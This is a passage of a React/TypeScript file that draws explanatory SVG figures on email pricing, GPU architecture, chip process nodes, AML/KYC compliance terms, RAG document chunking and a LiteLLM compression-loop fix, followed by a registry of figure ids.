    "Enforce MFA",
    "IMAP/POP for other clients",
  ];
  return (
    <Frame kicker="Business email for a 10-person team · approximate annual prices" title="Email alone costs a fraction of the full suite">
      <svg width={1456} height={580} viewBox="0 0 1456 580">
        <text x={0} y={36} fill={color.ink} fontSize={24} fontFamily={sans}>
          Google Workspace Business Starter
        </text>
        <rect x={0} y={56} width={820} height={60} rx={6} fill={color.warm} />
        <text x={840} y={96} fill={color.warm} fontSize={28} fontFamily={mono}>
          ~$840 / year
        </text>
        <text x={0} y={166} fill={color.ink} fontSize={24} fontFamily={sans}>
          Zoho Mail Lite
        </text>
        <rect x={0} y={186} width={146} height={60} rx={6} fill={color.accent} />
        <text x={166} y={226} fill={color.accent} fontSize={28} fontFamily={mono}>
          ~$120–150 / year
        </text>
        <text x={0} y={300} fill={color.muted} fontSize={20} fontFamily={sans}>
          Workspace pays for Gmail, Drive, Docs, Meet and Gemini; Zoho Lite is mail, calendar, contacts and admin.
        </text>
        <text x={0} y={364} fill={color.ink} fontSize={23} fontFamily={sans}>
          The Zoho setup, in order
        </text>
        {steps.map((t, i) => (
          <g key={t}>
            <circle cx={(i % 4) * 360 + 18} cy={406 + Math.floor(i / 4) * 56} r={16} fill={color.surface} stroke={color.line} />
            <text x={(i % 4) * 360 + 18} y={412 + Math.floor(i / 4) * 56} fill={color.muted} fontSize={18} fontFamily={mono} textAnchor="middle">
              {i + 1}
            </text>
            <text x={(i % 4) * 360 + 46} y={413 + Math.floor(i / 4) * 56} fill={color.ink} fontSize={21} fontFamily={sans}>
              {t}
            </text>
          </g>
        ))}
      </svg>
    </Frame>
  );
}

/* 47. GPU organisation ----------------------------------------------------------------------------------------- */
export function FigGpuLayout() {
  const sm = (x: number, y: number) => (
    <g key={`${x}-${y}`}>
      <rect x={x} y={y} width={190} height={150} rx={10} fill={color.surface} stroke={color.line} />
      <text x={x + 12} y={y + 26} fill={color.muted} fontSize={16} fontFamily={mono}>
        SM
      </text>
      {Array.from({ length: 24 }).map((_, i) => (
        <rect
          key={i}
          x={x + 12 + (i % 8) * 21}
          y={y + 38 + Math.floor(i / 8) * 21}
          width={15}
          height={15}
          rx={2}
          fill={color.accentDim}
          stroke={color.accent}
          strokeWidth={1}
        />
      ))}
      <rect x={x + 12} y={y + 108} width={78} height={28} rx={4} fill={color.warmDim} stroke={color.warm} />
      <text x={x + 51} y={y + 127} fill={color.warm} fontSize={14} fontFamily={mono} textAnchor="middle">
        tensor
      </text>
      <rect x={x + 100} y={y + 108} width={78} height={28} rx={4} fill={color.surface} stroke={color.muted} />
      <text x={x + 139} y={y + 127} fill={color.muted} fontSize={14} fontFamily={mono} textAnchor="middle">
        RT
      </text>
    </g>
  );
  return (
    <Frame kicker="Inside a GPU · simplified" title="Thousands of small cores, and a memory system to feed them">
      <svg width={1456} height={580} viewBox="0 0 1456 580">
        <rect x={0} y={0} width={880} height={360} rx={14} fill="none" stroke={color.line} strokeDasharray="8 8" />
        <text x={16} y={30} fill={color.muted} fontSize={19} fontFamily={sans}>
          processing cluster
        </text>
        {[0, 1, 2, 3].map((c) => sm(20 + c * 212, 46))}
        {[0, 1, 2, 3].map((c) => sm(20 + c * 212, 206))}
        <rect x={0} y={390} width={880} height={56} rx={10} fill={color.surface} stroke={color.line} />
        <text x={440} y={426} fill={color.ink} fontSize={22} fontFamily={sans} textAnchor="middle">
          shared L2 cache · memory controllers
        </text>
        <rect x={0} y={466} width={880} height={56} rx={10} fill={color.accentDim} stroke={color.accent} />
        <text x={440} y={502} fill={color.accent} fontSize={22} fontFamily={sans} textAnchor="middle">
          VRAM: GDDR (over 1 TB/s on high-end cards) or HBM (several TB/s)
        </text>
        <text x={930} y={70} fill={color.accent} fontSize={23} fontFamily={sans}>
          ■ cores: the arithmetic
        </text>
        <text x={930} y={120} fill={color.warm} fontSize={23} fontFamily={sans}>
          ■ tensor cores: matrix multiply-
        </text>
        <text x={958} y={150} fill={color.warm} fontSize={23} fontFamily={sans}>
          and-accumulate, for AI
        </text>
        <text x={930} y={200} fill={color.muted} fontSize={23} fontFamily={sans}>
          ■ RT cores: ray tracing
        </text>
        <text x={930} y={270} fill={color.ink} fontSize={23} fontFamily={sans}>
          Each SM also has schedulers,
        </text>
        <text x={930} y={300} fill={color.ink} fontSize={23} fontFamily={sans}>
          registers, shared memory, L1.
        </text>
        <text x={930} y={420} fill={color.ink} fontSize={23} fontFamily={sans}>
          For LLM inference, memory
        </text>
        <text x={930} y={450} fill={color.ink} fontSize={23} fontFamily={sans}>
          bandwidth, not compute, is
        </text>
        <text x={930} y={480} fill={color.ink} fontSize={23} fontFamily={sans}>
          often what limits tokens/s.
        </text>
      </svg>
    </Frame>
  );
}

/* 48. Process nodes -------------------------------------------------------------------------------------------- */
export function FigProcessNodes() {
  return (
    <Frame kicker="From the Intel 4004 to today's leading chips" title="Node names shrank 3,000×+; transistor counts grew millions×">
      <svg width={1456} height={580} viewBox="0 0 1456 580">
        <Box x={0} y={20} w={430} h={150} title="1971 · Intel 4004" sub="10 µm process · ~2,300 transistors" />
        <Arrow x1={430} y1={95} x2={520} y2={95} />
        <Box
          x={520}
          y={20}
          w={500}
          h={150}
          title="Today · marketed as 3 nm"
          sub="tens of billions; largest packages 100 billion+"
          tone={color.accent}
        />
        <text x={1060} y={70} fill={color.warm} fontSize={23} fontFamily={sans}>
          "3 nm" is a generation label:
        </text>
        <text x={1060} y={102} fill={color.warm} fontSize={23} fontFamily={sans}>
          no feature is 3 nm wide.
        </text>
        <text x={1060} y={146} fill={color.muted} fontSize={20} fontFamily={sans}>
          Progress is judged by density,
        </text>
        <text x={1060} y={174} fill={color.muted} fontSize={20} fontFamily={sans}>
          performance and power.
        </text>
        <text x={0} y={250} fill={color.ink} fontSize={24} fontFamily={sans}>
          How the gate kept control of a shrinking channel
        </text>
        {[
          ["Planar", "gate on top of a flat channel", "decades"],
          ["FinFET", "channel stands up as a fin; gate on 3 sides", "from about 2011"],
          ["Gate-all-around", "nanosheets; gate wraps the channel", "2 nm-class nodes"],
        ].map(([t, d, when], i) => (
          <g key={t}>
            <rect
              x={i * 490}
              y={280}
              width={460}
              height={150}
              rx={12}
              fill={i === 2 ? color.accentDim : color.surface}
              stroke={i === 2 ? color.accent : color.line}
            />
            <text x={i * 490 + 20} y={322} fill={i === 2 ? color.accent : color.ink} fontSize={27} fontFamily={sans}>
              {t}
            </text>
            <text x={i * 490 + 20} y={360} fill={color.ink} fontSize={20} fontFamily={sans}>
              {d}
            </text>
            <text x={i * 490 + 20} y={400} fill={color.muted} fontSize={19} fontFamily={sans}>
              {when}
            </text>
          </g>
        ))}
        <text x={0} y={490} fill={color.muted} fontSize={21} fontFamily={sans}>
          Why shrinking got hard: leakage, heat per square millimetre, and variation of a few atoms.
        </text>
      </svg>
    </Frame>
  );
}

/* 49. KYC, AML, KYB, CDD --------------------------------------------------------------------------------------- */
export function FigComplianceMap() {
  return (
    <Frame kicker="Five compliance terms, one picture" title="AML is the programme; KYC and KYB sit inside it">
      <svg width={1456} height={580} viewBox="0 0 1456 580">
        <rect x={0} y={0} width={1000} height={420} rx={18} fill="none" stroke={color.accent} strokeWidth={2} />
        <text x={24} y={40} fill={color.accent} fontSize={27} fontFamily={sans}>
          AML: the whole anti-money-laundering programme
        </text>
        <rect x={24} y={70} width={460} height={190} rx={14} fill={color.surface} stroke={color.line} />
        <text x={44} y={110} fill={color.ink} fontSize={26} fontFamily={sans}>
          KYC: is this person real?
        </text>
        <text x={44} y={150} fill={color.muted} fontSize={20} fontFamily={sans}>
          documents, face match, liveness,
        </text>
        <text x={44} y={178} fill={color.muted} fontSize={20} fontFamily={sans}>
          data checks
        </text>
        <rect x={510} y={70} width={466} height={190} rx={14} fill={color.surface} stroke={color.line} />
        <text x={530} y={110} fill={color.ink} fontSize={26} fontFamily={sans}>
          KYB: is this business real,
        </text>
        <text x={530} y={142} fill={color.ink} fontSize={26} fontFamily={sans}>
          and who owns it?
        </text>
        <text x={530} y={182} fill={color.muted} fontSize={20} fontFamily={sans}>
          registry checks, beneficial owners
        </text>
        {["sanctions, PEP and adverse-media screening", "transaction monitoring", "suspicious activity reports", "records, training, audits"].map(
          (t, i) => (
            <text key={t} x={44 + (i % 2) * 480} y={312 + Math.floor(i / 2) * 40} fill={color.ink} fontSize={21} fontFamily={sans}>
              · {t}
            </text>
          )
        )}
        <text x={1040} y={40} fill={color.ink} fontSize={24} fontFamily={sans}>
          How deep, by risk
        </text>
        {[
          ["Simplified", "low risk, where allowed", color.muted],
          ["CDD", "the standard level", color.ink],
          ["EDD", "PEPs, high-risk countries: deeper checks", color.warm],
        ].map(([t, d, tone], i) => (
          <g key={t}>
            <rect x={1040} y={70 + i * 118} width={410} height={100} rx={12} fill={color.surface} stroke={tone} strokeWidth={2} />
            <text x={1060} y={108 + i * 118} fill={tone} fontSize={25} fontFamily={sans}>
              {t}
            </text>
            <text x={1060} y={142 + i * 118} fill={color.muted} fontSize={17} fontFamily={sans}>
              {d.length > 40 ? d.slice(0, 38) + "…" : d}
            </text>
          </g>
        ))}
        <text x={0} y={490} fill={color.muted} fontSize={21} fontFamily={sans}>
          AI helps with OCR, face matching, fuzzy name matching and summarising media; thresholds and decisions stay deterministic.
        </text>
      </svg>
    </Frame>
  );
}

/* 50. RAG chunking --------------------------------------------------------------------------------------------- */
export function FigChunking() {
  const doc = [
    "# Refund policy",
    "## Eligibility",
    "Orders over $50 qualify.",
    "## Time limits",
    "The limit is 30 days.",
    "## Exceptions",
    "Digital goods: no refunds.",
  ];
  const col = (x: number, title: string, chunks: [number, number, string, string][], note: string, tone: string) => (
    <g>
      <text x={x} y={30} fill={tone} fontSize={24} fontFamily={sans}>
        {title}
      </text>
      {doc.map((l, i) => (
        <text key={l} x={x + 24} y={88 + i * 50} fill={l.startsWith("#") ? color.ink : color.muted} fontSize={21} fontFamily={mono}>
          {l}
        </text>
      ))}
      {chunks.map(([a, b, c, label], i) => (
        <g key={i}>
          <rect
            x={x + 8}
            y={62 + a * 50}
            width={600}
            height={(b - a) * 50}
            rx={8}
            fill="none"
            stroke={c}
            strokeWidth={2.5}
            strokeDasharray={i % 2 ? "8 6" : "none"}
          />
          <text x={x + 620} y={92 + a * 50} fill={c} fontSize={18} fontFamily={sans}>
            {label}
          </text>
        </g>
      ))}
      <text x={x} y={430} fill={color.muted} fontSize={20} fontFamily={sans}>
        {note}
      </text>
    </g>
  );
  return (
    <Frame kicker="Splitting a document for RAG · the same policy two ways" title="Split by structure, and keep the heading in every chunk">
      <svg width={1456} height={580} viewBox="0 0 1456 580">
        {col(
          0,
          "Fixed size with overlap",
          [
            [0, 3, color.warm, "1"],
            [2, 5, color.warm, "2"],
            [4, 7, color.warm, "3"],
          ],
          '"The limit is 30 days": the limit for what?',
          color.warm
        )}
        {col(
          760,
          "By heading, heading kept",
          [
            [1, 3, color.accent, "1"],
            [3, 5, color.accent, "2"],
            [5, 7, color.accent, "3"],
          ],
          "each chunk carries its heading and the title",
          color.accent
        )}
        <text x={0} y={500} fill={color.muted} fontSize={21} fontFamily={sans}>
          Fixed size still has a place for unstructured text. Choose the size by measuring recall@k on your own questions.
        </text>
      </svg>
    </Frame>
  );
}

/* 51. LiteLLM compression loop -------------------------------------------------------------------------------- */
export function FigCompressionLoop() {
  const steps: [string, string, string][] = [
    ["1", "Tool returns a JIRA issue", color.ink],
    ["2", "Gateway compresses it to <<ccr:HASH>>", color.ink],
    ["3", "Model calls headroom_retrieve", color.ink],
    ["4", "Retrieved text compressed again, same HASH", color.warm],
    ["5", "Model retrieves again, loops or answers empty", color.warm],
  ];
  return (
    <Frame kicker="LiteLLM context compression · client-side tool loops (PR #38591, merged)" title="Retrieved content must never be compressed again">
      <svg width={1456} height={580} viewBox="0 0 1456 580">
        {steps.map(([n, t, tone], i) => (
          <g key={n}>
            <rect
              x={0}
              y={i * 86}
              width={760}
              height={68}
              rx={10}
              fill={color.surface}
              stroke={tone === color.warm ? color.warm : color.line}
              strokeWidth={2}
            />
            <text x={24} y={i * 86 + 44} fill={tone} fontSize={24} fontFamily={mono}>
              {n}
            </text>
            <text x={64} y={i * 86 + 44} fill={tone} fontSize={23} fontFamily={sans}>
              {t}
            </text>
          </g>
        ))}
        <path d="M 760 380 L 820 380 L 820 206 L 776 206" fill="none" stroke={color.warm} strokeWidth={2.5} />
        <polygon points="764,206 780,197 780,215" fill={color.warm} />
        <text x={836} y={300} fill={color.warm} fontSize={20} fontFamily={sans}>
          the loop
        </text>
        <rect x={930} y={0} width={520} height={420} rx={14} fill={color.accentDim} stroke={color.accent} strokeWidth={2} />
        <text x={954} y={44} fill={color.accent} fontSize={26} fontFamily={sans}>
          The fix
        </text>
        {[
          "Recognise retrieve results by name:",
          "headroom_retrieve or",
          "mcp__server__headroom_retrieve",
          "",
          "Truncated name? Match the",
          "tool-call id instead",
          "",
          "Reuse the protected-row path:",
          "everything else still compresses",
        ].map((t, i) => (
          <text
            key={i}
            x={954}
            y={92 + i * 34}
            fill={t.startsWith("headroom") || t.startsWith("mcp") ? color.ink : color.ink}
            fontSize={21}
            fontFamily={t.includes("headroom") ? mono : sans}
          >
            {t}
          </text>
        ))}
        <text x={0} y={500} fill={color.muted} fontSize={21} fontFamily={sans}>
          It only happened when the client (such as Claude Code) runs the tool loop: each request looks new to the gateway.
        </text>
      </svg>
    </Frame>
  );
}

export const figures = [
  { id: "fig-passport-ocr-vs-nfc", component: FigOcrVsNfc },
  { id: "fig-kyc-data-retention", component: FigKycRetention },
  { id: "fig-liveness-apcer", component: FigLivenessApcer },
  { id: "fig-ann-recall", component: FigAnnRecall },
  { id: "fig-latency-percentiles", component: FigLatencyPercentiles },
  { id: "fig-exif-orientation", component: FigExifOrientation },
  { id: "fig-asyncio-timeout", component: FigAsyncioTimeout },
  { id: "fig-idempotency-keys", component: FigIdempotencyKeys },
  { id: "fig-calibration", component: FigCalibration },
  { id: "fig-cancel-on-disconnect", component: FigCancelOnDisconnect },
  { id: "fig-fts5-stemming", component: FigFts5Stemming },
  { id: "fig-upload-magic-bytes", component: FigMagicBytes },
  { id: "fig-dst-schedule", component: FigDstSchedule },
  { id: "fig-pii-redaction", component: FigPiiRedaction },
  { id: "fig-judge-kappa", component: FigJudgeKappa },
  { id: "fig-active-liveness", component: FigActiveLiveness },
  { id: "fig-aml-structuring", component: FigAmlStructuring },
  { id: "fig-kyb-ownership", component: FigKybOwnership },
  { id: "fig-kyc-selfie-match", component: FigKycSelfieMatch },
  { id: "fig-cdd-edd-risk", component: FigCddEdd },
  { id: "fig-voice-tool-calls", component: FigVoiceToolCalls },
  { id: "fig-ocr-metrics", component: FigOcrMetrics },
  { id: "fig-mrz-fields", component: FigMrzFields },
  { id: "fig-webhook-signatures", component: FigWebhookSignatures },
  { id: "fig-partial-json", component: FigPartialJson },
  { id: "fig-passport-bac-keys", component: FigPassportBacKeys },
  { id: "fig-similarity-metrics", component: FigSimilarityMetrics },
  { id: "fig-passive-auth", component: FigPassiveAuth },
  { id: "fig-vapi-hmac", component: FigVapiHmac },
  { id: "fig-approval-flow", component: FigApprovalFlow },
  { id: "fig-guest-otp", component: FigGuestOtp },
  { id: "fig-ssrf-guard", component: FigSsrfGuard },
  { id: "fig-csv-injection", component: FigCsvInjection },
  { id: "fig-outreach-guardrails", component: FigOutreachGuardrails },
  { id: "fig-http-ranges", component: FigHttpRanges },
  { id: "fig-approval-states", component: FigApprovalStates },
  { id: "fig-otp-flow", component: FigOtpFlow },
  { id: "fig-ssrf-pipeline", component: FigSsrfPipeline },
  { id: "fig-csv-sheet", component: FigCsvSheet },
  { id: "fig-guardrail-pipeline", component: FigGuardrailPipeline },
  { id: "fig-range-resume", component: FigRangeResume },
  { id: "fig-liveness-threats", component: FigLivenessThreats },
  { id: "fig-vector-search-pipeline", component: FigVectorSearchPipeline },
  { id: "fig-averaged-p95", component: FigAveragedP95 },
  { id: "fig-librepods-tray", component: FigLibrePodsTray },
  { id: "fig-mail-cost", component: FigMailCost },
  { id: "fig-gpu-layout", component: FigGpuLayout },
  { id: "fig-process-nodes", component: FigProcessNodes },
  { id: "fig-compliance-map", component: FigComplianceMap },
  { id: "fig-chunking", component: FigChunking },
  { id: "fig-compression-loop", component: FigCompressionLoop },
] as const;
